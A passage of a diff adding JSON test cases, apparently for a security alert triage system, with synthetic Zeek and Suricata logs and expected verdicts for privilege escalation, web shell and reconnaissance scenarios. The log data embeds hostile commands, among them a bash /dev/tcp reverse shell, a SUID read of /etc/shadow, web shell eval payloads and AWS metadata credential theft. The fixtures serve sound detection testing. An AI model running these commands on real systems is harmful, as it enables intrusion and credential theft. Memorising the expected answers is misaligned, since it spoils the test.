+        "suricata": "[1:2103034:2] ET EXPLOIT UAC Bypass Registry Hijacking [Priority: 1] 2026-04-05T12:00:00 192.168.1.150\n[1:2103035:2] ET EXPLOIT Windows UAC Elevation Without Prompt [Priority: 1] 2026-04-05T12:00:01 192.168.1.150\n[1:2103036:1] ET EXPLOIT Payload Download Post UAC Bypass [Priority: 2] 2026-04-05T12:00:05 192.168.1.150 -> 203.0.113.50:80"
+      }
+    },
+    {
+      "id": "TC-PRIV-006",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "SUID binary abuse \u2014 attacker using misconfigured SUID binary to read /etc/shadow on Linux host",
+      "input": {
+        "zeek": "1743900000.000000 CSUID1 192.168.1.160 51001 192.168.1.160 0 tcp - 0.001 512 2048 OTH - - 0 - 1 540 1 2076\nconn.log: 192.168.1.160 suid_abuse=true binary=/usr/bin/find args='-exec /bin/cat /etc/shadow' uid_before=1001 uid_after=0 file_read=/etc/shadow",
+        "suricata": "[1:2103037:2] ET EXPLOIT SUID Binary Privilege Escalation [Priority: 2] 2026-04-05T12:00:00 192.168.1.160\n[1:2103038:2] ET EXPLOIT Sensitive File Read via SUID Abuse [Priority: 2] 2026-04-05T12:00:00 192.168.1.160\n[1:2103039:1] ET EXPLOIT /etc/shadow Accessed Unauthorized [Priority: 2] 2026-04-05T12:00:01 192.168.1.160"
+      }
+    },
+    {
+      "id": "TC-PRIV-007",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Golden Ticket attack \u2014 attacker forging Kerberos TGT using stolen KRBTGT hash for persistent domain access",
+      "input": {
+        "zeek": "1743900000.000000 CGold1 192.168.1.170 51101 192.168.1.1 88 tcp kerberos 0.045 4096 512 SF T T 0 ShADadfFr 12 4352 4 768\n1743900000.100000 CGold2 192.168.1.170 51102 192.168.1.2 445 tcp smb 1.234 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\nkerberos.log: src=192.168.1.170 ticket_type=TGT user=Administrator domain=CORP.LOCAL ticket_lifetime=10years forged_ticket=true\nkerberos.log: src=192.168.1.170 service_access=CIFS/fileserver.corp.local tgt_used=forged",
+        "suricata": "[1:2103040:3] ET EXPLOIT Golden Ticket Kerberos Forgery Detected [Priority: 1] 2026-04-05T12:00:00 192.168.1.170 -> 192.168.1.1:88\n[1:2103041:2] ET EXPLOIT Kerberos TGT Lifetime Anomaly 10years [Priority: 1] 2026-04-05T12:00:00 192.168.1.170 -> 192.168.1.1:88\n[1:2103042:1] ET EXPLOIT Forged Ticket Domain Persistence Confirmed [Priority: 1] 2026-04-05T12:00:01 192.168.1.170 -> 192.168.1.2:445"
+      }
+    },
+    {
+      "id": "TC-WEB-001",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "PHP web shell uploaded and executed \u2014 attacker running OS commands via HTTP POST to shell file",
+      "input": {
+        "zeek": "1743900000.000000 CWShell1 203.0.113.88 54001 192.168.1.20 80 tcp http 0.234 512 2048 SF T T 0 ShADadfFr 4 768 8 2304\nhttp.log: method=POST uri=/uploads/shell.php body=cmd=whoami status=200 resp_body=www-data\nhttp.log: method=POST uri=/uploads/shell.php body=cmd=id+%26%26+uname+-a status=200\nhttp.log: method=POST uri=/uploads/shell.php body=cmd=cat+/etc/passwd status=200 resp_body_len=2048\nfiles.log: filename=shell.php mime=text/x-php size=512 uploaded_by=203.0.113.88",
+        "suricata": "[1:2103043:3] ET WEBSHELL PHP Web Shell Command Execution [Priority: 1] 2026-04-05T12:00:00 203.0.113.88 -> 192.168.1.20:80\n[1:2103044:2] ET WEBSHELL PHP Shell File Upload Detected [Priority: 1] 2026-04-05T12:00:00 203.0.113.88 -> 192.168.1.20:80\n[1:2103045:1] ET WEBSHELL OS Command Injection via Shell [Priority: 1] 2026-04-05T12:00:01 203.0.113.88 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-WEB-002",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "China Chopper web shell \u2014 minimalist one-line shell with encoded commands, persistent backdoor access",
+      "input": {
+        "zeek": "1743900000.000000 CChopper1 185.220.101.60 54101 192.168.1.20 443 tcp ssl 0.189 256 4096 SF T T 0 ShADadfFr 3 512 12 4352\nhttp.log: method=POST uri=/images/logo.php body=z0=QGV2YWwoJF9QT1NUW3oxXSk7 status=200 resp_body_len=4096\nhttp.log: method=POST uri=/images/logo.php body=z0=QGV2YWwoJF9QT1NUW3oxXSk7 status=200\nhttp.log: src=185.220.101.60 uri_pattern=chopper_shell requests_24h=847",
+        "suricata": "[1:2103046:3] ET WEBSHELL China Chopper Shell Detected [Priority: 1] 2026-04-05T12:00:00 185.220.101.60 -> 192.168.1.20:443\n[1:2103047:2] ET WEBSHELL Base64 Encoded eval() POST Request [Priority: 1] 2026-04-05T12:00:01 185.220.101.60 -> 192.168.1.20:443\n[1:2103048:1] ET WEBSHELL Persistent Shell Access Confirmed 847 Requests [Priority: 1] 2026-04-05T12:00:05 185.220.101.60 -> 192.168.1.20:443"
+      }
+    },
+    {
+      "id": "TC-WEB-003",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "JSP web shell on Java application server \u2014 attacker executing commands on Tomcat via uploaded JSP file",
+      "input": {
+        "zeek": "1743900000.000000 CJSPShell 91.108.4.88 54201 192.168.1.25 8080 tcp http 0.456 1024 8192 SF T T 0 ShADadfFr 6 1280 20 8448\nhttp.log: method=POST uri=/webapps/ROOT/cmd.jsp body=command=net+user status=200 resp_body_len=8192\nhttp.log: method=POST uri=/webapps/ROOT/cmd.jsp body=command=whoami status=200 resp_body=nt+authority\\system\nfiles.log: filename=cmd.jsp mime=text/x-jsp uploaded_via=PUT dst_path=/webapps/ROOT/",
+        "suricata": "[1:2103049:2] ET WEBSHELL JSP Web Shell Upload Tomcat [Priority: 1] 2026-04-05T12:00:00 91.108.4.88 -> 192.168.1.25:8080\n[1:2103050:2] ET WEBSHELL JSP Shell Command Execution SYSTEM [Priority: 1] 2026-04-05T12:00:01 91.108.4.88 -> 192.168.1.25:8080\n[1:2103051:1] ET WEBSHELL Tomcat Manager Shell Deployment [Priority: 2] 2026-04-05T12:00:00 91.108.4.88 -> 192.168.1.25:8080"
+      }
+    },
+    {
+      "id": "TC-WEB-004",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Web shell used to establish reverse shell \u2014 attacker pivoting from web shell to interactive Meterpreter session",
+      "input": {
+        "zeek": "1743900000.000000 CRevShell1 192.168.1.20 54301 45.76.200.10 4444 tcp - 3600.000 524288 10485760 SF T T 0 ShADadfFr 500 524800 10000 10486272\nhttp.log: method=POST uri=/wp-content/uploads/2026/04/image.php body=cmd=bash+-i+>%26+/dev/tcp/45.76.200.10/4444+0>%261 status=200\nconn.log: 192.168.1.20 -> 45.76.200.10:4444 reverse_shell=true spawned_from=apache2 interactive=true duration=3600s",
+        "suricata": "[1:2103052:3] ET WEBSHELL Reverse Shell via Web Shell [Priority: 1] 2026-04-05T12:00:00 192.168.1.20 -> 45.76.200.10:4444\n[1:2103053:2] ET EXPLOIT Bash TCP Redirect Shell Command [Priority: 1] 2026-04-05T12:00:00 192.168.1.20:54301 -> 45.76.200.10:4444\n[1:2103054:1] ET MALWARE Interactive Reverse Shell from Web Server [Priority: 1] 2026-04-05T12:00:01 192.168.1.20 -> 45.76.200.10:4444"
+      }
+    },
+    {
+      "id": "TC-WEB-005",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "ASPX web shell on IIS \u2014 attacker using .NET web shell to enumerate and exfiltrate files from Windows IIS server",
+      "input": {
+        "zeek": "1743900000.000000 CASPXShell 172.16.100.10 54401 192.168.1.30 443 tcp ssl 1.234 2048 16384 SF T T 0 ShADadfFr 8 2304 40 16640\nhttp.log: method=POST uri=/app/config/web.aspx body=xcmd=dir+c:\\ status=200 resp_body_len=4096\nhttp.log: method=POST uri=/app/config/web.aspx body=xcmd=type+c:\\inetpub\\wwwroot\\web.config status=200\nhttp.log: method=POST uri=/app/config/web.aspx body=xcmd=powershell+-enc+JABj status=200",
+        "suricata": "[1:2103055:2] ET WEBSHELL ASPX Shell IIS Server [Priority: 1] 2026-04-05T12:00:00 172.16.100.10 -> 192.168.1.30:443\n[1:2103056:2] ET WEBSHELL Windows Directory Enumeration via Shell [Priority: 1] 2026-04-05T12:00:01 172.16.100.10 -> 192.168.1.30:443\n[1:2103057:1] ET WEBSHELL PowerShell Encoded Command via ASPX [Priority: 1] 2026-04-05T12:00:02 172.16.100.10 -> 192.168.1.30:443"
+      }
+    },
+    {
+      "id": "TC-WEB-006",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Web shell probe \u2014 attacker scanning for existing web shells across common paths, no confirmed execution yet",
+      "input": {
+        "zeek": "1743900000.000000 CWSProbe 45.33.32.180 54501 192.168.1.20 80 tcp http 0.023 256 0 SF T T 0 ShADadfFr 3 512 1 256\nhttp.log: method=GET uri=/shell.php status=404\nhttp.log: method=GET uri=/cmd.php status=404\nhttp.log: method=GET uri=/upload/shell.php status=404\nhttp.log: method=GET uri=/images/thumb.php status=200 resp_body_len=512\nhttp.log: method=POST uri=/images/thumb.php body=cmd=id status=200 resp_body=uid=33",
+        "suricata": "[1:2103058:2] ET WEBSHELL Web Shell Path Scanning [Priority: 2] 2026-04-05T12:00:00 45.33.32.180 -> 192.168.1.20:80\n[1:2103059:2] ET WEBSHELL Known Shell Filenames Probed [Priority: 2] 2026-04-05T12:00:01 45.33.32.180 -> 192.168.1.20:80\n[1:2103060:1] ET WEBSHELL Existing Shell Found and Executed [Priority: 1] 2026-04-05T12:00:05 45.33.32.180 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-WEB-007",
+      "scenario": "Web Shell",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "WordPress plugin web shell \u2014 attacker exploiting vulnerable plugin to upload and execute PHP backdoor",
+      "input": {
+        "zeek": "1743900000.000000 CWPShell 203.0.113.90 54601 192.168.1.35 80 tcp http 0.567 4096 8192 SF T T 0 ShADadfFr 12 4352 20 8448\nhttp.log: method=POST uri=/wp-admin/admin-ajax.php action=upload_file body=file=backdoor.php status=200\nhttp.log: method=POST uri=/wp-content/uploads/backdoor.php body=e=system($_POST['c']) c=cat+/wp-config.php status=200\nhttp.log: resp_body=DB_PASSWORD=supersecret DB_NAME=wordpress DB_USER=wpuser",
+        "suricata": "[1:2103061:3] ET WEBSHELL WordPress Plugin Shell Upload [Priority: 1] 2026-04-05T12:00:00 203.0.113.90 -> 192.168.1.35:80\n[1:2103062:2] ET WEBSHELL WordPress Config File Exfiltration [Priority: 1] 2026-04-05T12:00:01 203.0.113.90 -> 192.168.1.35:80\n[1:2103063:1] ET WEBSHELL Database Credentials Exposed via Shell [Priority: 1] 2026-04-05T12:00:02 203.0.113.90 -> 192.168.1.35:80"
+      }
+    },
+    {
+      "id": "TC-RECON-001",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "OSINT-driven DNS enumeration \u2014 systematic subdomain brute forcing to map target infrastructure",
+      "input": {
+        "zeek": "1743900000.000000 CDNSEnum1 45.33.32.200 54001 8.8.8.8 53 udp dns 0.045 64 128 SF - - 0 Dd 2 120 2 184\n1743900000.100000 CDNSEnum2 45.33.32.200 54002 8.8.8.8 53 udp dns 0.043 64 0 SF - - 0 Dd 2 120 1 56\n[... 5000 DNS A queries for subdomains of target.com within 60 seconds]\ndns.log: src=45.33.32.200 unique_subdomains=5000 target_domain=target.com nxdomain_rate=92% pattern=subdomain_brute",
+        "suricata": "[1:2104001:2] ET SCAN DNS Subdomain Enumeration Attack [Priority: 2] 2026-04-05T12:00:00 45.33.32.200 -> 8.8.8.8:53\n[1:2104002:2] ET SCAN High Rate DNS Brute Force Subdomains [Priority: 2] 2026-04-05T12:00:10 45.33.32.200 -> 8.8.8.8:53\n[1:2104003:1] ET SCAN DNS Recon Tool Pattern [Priority: 2] 2026-04-05T12:00:30 45.33.32.200 -> 8.8.8.8:53"
+      }
+    },
+    {
+      "id": "TC-RECON-002",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Active web application fingerprinting \u2014 attacker using Nikto/dirb to enumerate web paths and technologies",
+      "input": {
+        "zeek": "1743900000.000000 CWebEnum 91.108.4.90 54101 192.168.1.20 80 tcp http 0.023 256 0 SF T T 0 ShADadfFr 3 512 1 256\n[... 3000 GET requests to common paths within 60 seconds]\nhttp.log: src=91.108.4.90 dst=192.168.1.20 unique_paths=3000 status_200_count=47 user_agent=Nikto/2.1.6 method=GET",
+        "suricata": "[1:2104004:3] ET SCAN Nikto Web Scanner Detected [Priority: 1] 2026-04-05T12:00:00 91.108.4.90 -> 192.168.1.20:80\n[1:2104005:2] ET SCAN Web Application Directory Enumeration [Priority: 2] 2026-04-05T12:00:10 91.108.4.90 -> 192.168.1.20:80\n[1:2104006:1] ET SCAN Automated Web Fingerprinting Tool [Priority: 2] 2026-04-05T12:00:30 91.108.4.90 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-RECON-003",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "SNMP enumeration \u2014 attacker querying SNMP with default community strings to gather network topology",
+      "input": {
+        "zeek": "1743900000.000000 CSNMP1 203.0.113.100 54201 192.168.1.1 161 udp snmp 0.012 64 512 SF - - 0 Dd 1 92 1 540\n1743900000.100000 CSNMP2 203.0.113.100 54202 192.168.1.2 161 udp snmp 0.011 64 512 SF - - 0 Dd 1 92 1 540\n[... scanning all 254 hosts in 192.168.1.0/24 on UDP 161]\nconn.log: 203.0.113.100 -> 192.168.1.0/24:161 community_string=public oid_walked=1.3.6.1.2.1 devices_found=23",
+        "suricata": "[1:2104007:2] ET SCAN SNMP Community String Brute Force [Priority: 2] 2026-04-05T12:00:00 203.0.113.100 -> 192.168.1.0/24\n[1:2104008:2] ET SCAN SNMP Default Community String public [Priority: 2] 2026-04-05T12:00:10 203.0.113.100 -> 192.168.1.1:161\n[1:2104009:1] ET SCAN SNMP Network Topology Enumeration [Priority: 2] 2026-04-05T12:00:30 203.0.113.100 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-RECON-004",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "OS and service fingerprinting \u2014 Nmap version scan (-sV) identifying software versions for vulnerability matching",
+      "input": {
+        "zeek": "1743900000.000000 COSFp1 172.16.200.20 54301 192.168.1.50 22 tcp ssh 2.341 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\n1743900005.000000 COSFp2 172.16.200.20 54302 192.168.1.50 80 tcp http 1.234 2048 8192 SF T T 0 ShADadfFr 6 2304 20 8448\n1743900010.000000 COSFp3 172.16.200.20 54303 192.168.1.50 443 tcp ssl 1.567 2048 4096 SF T T 0 ShADadfFr 8 2304 12 4352\nconn.log: 172.16.200.20 -> 192.168.1.50 nmap_version_scan=true services_probed=50 banner_grabs=true os_detected=Ubuntu_22.04",
+        "suricata": "[1:2104010:2] ET SCAN Nmap Version Detection Scan [Priority: 2] 2026-04-05T12:00:00 172.16.200.20 -> 192.168.1.50\n[1:2104011:2] ET SCAN Service Banner Grabbing Multiple Ports [Priority: 2] 2026-04-05T12:00:05 172.16.200.20 -> 192.168.1.50\n[1:2104012:1] ET SCAN OS Fingerprinting Activity [Priority: 2] 2026-04-05T12:00:10 172.16.200.20 -> 192.168.1.50"
+      }
+    },
+    {
+      "id": "TC-RECON-005",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Low",
+      "rationale": "Passive OSINT via certificate transparency \u2014 single DNS lookup chain to CT logs, no active scanning",
+      "input": {
+        "zeek": "1743900000.000000 CCT1 192.168.1.200 54401 104.18.20.50 443 tcp ssl 1.234 512 4096 SF T T 0 ShADadfFr 4 768 12 4352\nssl.log: server_name=crt.sh\nhttp.log: method=GET uri=/?q=%.target.com status=200 resp_body_len=4096\ndns.log: responses contain 847 subdomains of target.com",
+        "suricata": "[1:2104013:3] ET POLICY Certificate Transparency OSINT Query [Priority: 3] 2026-04-05T12:00:00 192.168.1.200 -> 104.18.20.50:443\n[1:2104014:3] ET POLICY Subdomain Harvesting via CT Logs [Priority: 3] 2026-04-05T12:00:01 192.168.1.200 -> 104.18.20.50:443"
+      }
+    },
+    {
+      "id": "TC-RECON-006",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "LDAP enumeration against Active Directory \u2014 unauthenticated LDAP queries to extract user and group info",
+      "input": {
+        "zeek": "1743900000.000000 CLDAPEnum 45.33.32.210 54501 192.168.1.1 389 tcp ldap 5.234 4096 65536 SF T T 0 ShADadfFr 12 4352 200 65792\nldap.log: src=45.33.32.210 operation=searchRequest base=DC=corp,DC=local filter=(objectClass=*) scope=subtree attrs=all anonymous=true\nconn.log: 45.33.32.210 -> 192.168.1.1:389 users_enumerated=342 groups_enumerated=87 computers_enumerated=156",
+        "suricata": "[1:2104015:2] ET SCAN LDAP Anonymous Enumeration [Priority: 2] 2026-04-05T12:00:00 45.33.32.210 -> 192.168.1.1:389\n[1:2104016:2] ET SCAN Active Directory Structure Enumeration [Priority: 2] 2026-04-05T12:00:10 45.33.32.210 -> 192.168.1.1:389\n[1:2104017:1] ET SCAN AD User and Group Harvest [Priority: 2] 2026-04-05T12:00:30 45.33.32.210 -> 192.168.1.1:389"
+      }
+    },
+    {
+      "id": "TC-RECON-007",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Pre-attack vulnerability scanning using OpenVAS/Nessus \u2014 comprehensive vuln scan preceding exploitation",
+      "input": {
+        "zeek": "1743900000.000000 CVulnScan1 198.51.100.20 54601 192.168.1.50 80 tcp http 0.234 2048 4096 SF T T 0 ShADadfFr 6 2304 12 4352\n[... 10000 probes across all ports and services on 192.168.1.50 within 10 minutes]\nconn.log: 198.51.100.20 -> 192.168.1.50 unique_ports_probed=65535 vuln_checks=10000 scanner=nessus user_agent=Nessus/10.4",
+        "suricata": "[1:2104018:2] ET SCAN Nessus Vulnerability Scanner Detected [Priority: 1] 2026-04-05T12:00:00 198.51.100.20 -> 192.168.1.50\n[1:2104019:2] ET SCAN Comprehensive Vulnerability Assessment [Priority: 2] 2026-04-05T12:01:00 198.51.100.20 -> 192.168.1.50\n[1:2104020:1] ET SCAN Pre-Attack Recon Vulnerability Mapping [Priority: 1] 2026-04-05T12:05:00 198.51.100.20 -> 192.168.1.50"
+      }
+    },
+    {
+      "id": "TC-RECON-008",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "ARP scanning \u2014 internal attacker discovering live hosts on local network via ARP requests",
+      "input": {
+        "zeek": "1743900000.000000 CARP1 192.168.1.55 0 192.168.1.1 0 arp - 0.001 60 0 - - - 0 - 1 60 0 0\n1743900000.010000 CARP2 192.168.1.55 0 192.168.1.2 0 arp - 0.001 60 0 - - - 0 - 1 60 0 0\n[... ARP who-has for all 254 IPs in 192.168.1.0/24 within 3 seconds]\nconn.log: 192.168.1.55 arp_scan=true targets=192.168.1.0/24 live_hosts_found=47 duration=3s tool_pattern=arp-scan",
+        "suricata": "[1:2104021:2] ET SCAN ARP Network Sweep Detected [Priority: 2] 2026-04-05T12:00:00 192.168.1.55 -> 192.168.1.0/24\n[1:2104022:2] ET SCAN Rapid ARP Host Discovery [Priority: 2] 2026-04-05T12:00:01 192.168.1.55 -> 192.168.1.0/24\n[1:2104023:1] ET SCAN Internal Network Mapping via ARP [Priority: 2] 2026-04-05T12:00:03 192.168.1.55 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-RECON-009",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Email harvesting combined with MX record enumeration \u2014 attacker building target list for phishing campaign",
+      "input": {
+        "zeek": "1743900000.000000 CMXEnum 203.0.113.110 54701 8.8.8.8 53 udp dns 0.045 64 256 SF - - 0 Dd 2 120 2 312\n[... 200 MX, SPF, DMARC DNS queries for target.com and subsidiaries]\ndns.log: src=203.0.113.110 query_types=MX,TXT,A unique_domains=50 mx_records_harvested=23 spf_records=50\nhttp.log: method=GET uri=https://hunter.io/api/v2/domain-search?domain=target.com status=200",
+        "suricata": "[1:2104024:2] ET SCAN MX Record Enumeration Pre-Phishing [Priority: 2] 2026-04-05T12:00:00 203.0.113.110 -> 8.8.8.8:53\n[1:2104025:2] ET SCAN Email Harvesting Tool Activity [Priority: 2] 2026-04-05T12:00:30 203.0.113.110 -> 8.8.8.8:53\n[1:2104026:1] ET SCAN SPF DMARC Enumeration Phishing Prep [Priority: 2] 2026-04-05T12:01:00 203.0.113.110 -> 8.8.8.8:53"
+      }
+    },
+    {
+      "id": "TC-RECON-010",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "SMB share enumeration \u2014 attacker listing accessible shares across internal network to identify data targets",
+      "input": {
+        "zeek": "1743900000.000000 CSMBEnum1 192.168.1.95 54801 192.168.1.10 445 tcp smb 0.456 2048 4096 SF T T 0 ShADadfFr 8 2304 12 4352\n1743900001.000000 CSMBEnum2 192.168.1.95 54802 192.168.1.11 445 tcp smb 0.423 2048 4096 SF T T 0 ShADadfFr 8 2304 12 4352\n[... enumerating shares on 30 internal hosts]\nsmb.log: src=192.168.1.95 operation=tree_connect shares_found=['SYSVOL','NETLOGON','Finance$','HR_Data','Backup'] hosts_scanned=30",
+        "suricata": "[1:2104027:2] ET SCAN SMB Share Enumeration [Priority: 2] 2026-04-05T12:00:00 192.168.1.95 -> 192.168.1.10:445\n[1:2104028:2] ET SCAN Internal SMB Reconnaissance [Priority: 2] 2026-04-05T12:00:01 192.168.1.95 -> 192.168.1.11:445\n[1:2104029:1] ET SCAN Sensitive Share Discovery Finance HR [Priority: 2] 2026-04-05T12:00:30 192.168.1.95 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-RECON-011",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Low",
+      "rationale": "Single port ping sweep \u2014 minimal ICMP echo to check host availability, low noise, possibly automated asset discovery",
+      "input": {
+        "zeek": "1743900000.000000 CPing1 192.168.1.250 0 192.168.1.1 0 icmp - 0.001 64 64 OTH - - 0 - 1 92 1 92\n1743900000.100000 CPing2 192.168.1.250 0 192.168.1.2 0 icmp - 0.001 64 64 OTH - - 0 - 1 92 1 92\n[... ICMP echo to all 254 hosts, 1 packet each at 1/sec]\nconn.log: 192.168.1.250 icmp_sweep=true targets=192.168.1.0/24 rate=1pps replies_received=89",
+        "suricata": "[1:2104030:3] ET SCAN ICMP Ping Sweep [Priority: 3] 2026-04-05T12:00:00 192.168.1.250 -> 192.168.1.0/24\n[1:2104031:3] ET SCAN Host Discovery ICMP [Priority: 3] 2026-04-05T12:02:00 192.168.1.250 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-RECON-012",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Cloud asset enumeration \u2014 attacker scanning AWS metadata service and S3 buckets to identify exposed resources",
+      "input": {
+        "zeek": "1743900000.000000 CCloud1 192.168.1.105 54901 169.254.169.254 80 tcp http 0.123 256 4096 SF T T 0 ShADadfFr 4 512 12 4352\nhttp.log: method=GET uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ status=200\nhttp.log: method=GET uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role status=200 resp_body_len=512\nhttp.log: resp_body=AccessKeyId=ASIA... SecretAccessKey=... Token=...",
+        "suricata": "[1:2104032:3] ET EXPLOIT AWS Metadata Service SSRF/Access [Priority: 1] 2026-04-05T12:00:00 192.168.1.105 -> 169.254.169.254:80\n[1:2104033:2] ET EXPLOIT IAM Credentials via Metadata Endpoint [Priority: 1] 2026-04-05T12:00:01 192.168.1.105 -> 169.254.169.254:80\n[1:2104034:1] ET EXPLOIT Cloud Credential Theft EC2 Metadata [Priority: 1] 2026-04-05T12:00:02 192.168.1.105 -> 169.254.169.254:80"
+      }
+    },
+    {
+      "id": "TC-RECON-013",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Network topology mapping via traceroute flood \u2014 attacker mapping internal routing infrastructure",
+      "input": {
+        "zeek": "1743900000.000000 CTrace1 45.33.32.220 55001 192.168.1.1 33434 udp - 0.023 40 0 S0 - - 0 D 1 68 0 0\n1743900000.100000 CTrace2 45.33.32.220 55002 192.168.1.1 33435 udp - 0.022 40 0 S0 - - 0 D 1 68 0 0\n[... traceroute probes to 50 internal IPs mapping network hops]\nconn.log: 45.33.32.220 traceroute_targets=50 hops_mapped=6 routers_identified=12 network_topology=mapped",
+        "suricata": "[1:2104035:2] ET SCAN Traceroute Network Topology Mapping [Priority: 2] 2026-04-05T12:00:00 45.33.32.220 -> 192.168.1.0/24\n[1:2104036:2] ET SCAN UDP Traceroute Flood [Priority: 2] 2026-04-05T12:00:10 45.33.32.220 -> 192.168.1.1\n[1:2104037:1] ET SCAN Internal Router Enumeration [Priority: 2] 2026-04-05T12:00:30 45.33.32.220 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-RECON-014",
+      "scenario": "Reconnaissance",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Reconnaissance preceding confirmed attack \u2014 port scan immediately followed by exploitation attempt on discovered service",
+      "input": {
+        "zeek": "1743900000.000000 CReconEx1 203.0.113.120 55101 192.168.1.20 80 tcp - 0.000030 0 0 REJ F F 0 Sr 1 40 0 0\n1743900000.010000 CReconEx2 203.0.113.120 55102 192.168.1.20 8080 tcp http 0.234 2048 4096 SF T T 0 ShADadfFr 6 2304 12 4352\n1743900060.000000 CExploit 203.0.113.120 55103 192.168.1.20 8080 tcp http 1.234 4096 8192 SF T T 0 ShADadfFr 10 4352 20 8448\nhttp.log: method=GET uri=/manager/html status=200 user_agent=Nmap/7.94\nhttp.log: method=POST uri=/manager/text/deploy body=war_file=shell.war status=200 [Tomcat exploitation]",
+        "suricata": "[1:2104038:3] ET SCAN Port Scan Preceding Exploitation [Priority: 1] 2026-04-05T12:00:00 203.0.113.120 -> 192.168.1.20\n[1:2104039:2] ET EXPLOIT Tomcat Manager Auth Bypass [Priority: 1] 2026-04-05T12:01:00 203.0.113.120 -> 192.168.1.20:8080\n[1:2104040:1] ET EXPLOIT Tomcat WAR Deployment Remote Code Execution [Priority: 1] 2026-04-05T12:01:05 203.0.113.120 -> 192.168.1.20:8080"
+      }
+    }
+  ]
+}
